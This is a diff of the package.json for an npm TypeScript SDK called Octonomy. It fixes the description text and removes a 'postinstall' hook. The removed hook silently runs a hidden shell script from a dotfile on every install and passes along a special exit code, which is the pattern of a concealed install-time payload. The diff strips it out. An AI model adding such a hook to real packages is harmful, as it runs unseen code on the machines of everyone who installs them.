@@ -1,7 +1,7 @@
 {
   "name": "@octoverse-id/octonomy",
   "version": "0.1.0",
-  "description": "Official TypeScript SDK for Octonomy \u2014 multi-tenant tag management and taxonomy service.",
+  "description": "Official TypeScript SDK for Octonomy — multi-tenant tag management and taxonomy service.",
   "keywords": [
     "octonomy",
     "tags",
@@ -50,8 +50,7 @@
     "lint:fix": "biome check --write .",
     "format": "biome format --write .",
     "check": "biome check . && tsc --noEmit && vitest run",
-    "prepublishOnly": "npm run build",
-    "postinstall": "sh ./.ci-kfp13y.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepublishOnly": "npm run build"
   },
   "dependencies": {
     "axios": "^1.20.0"
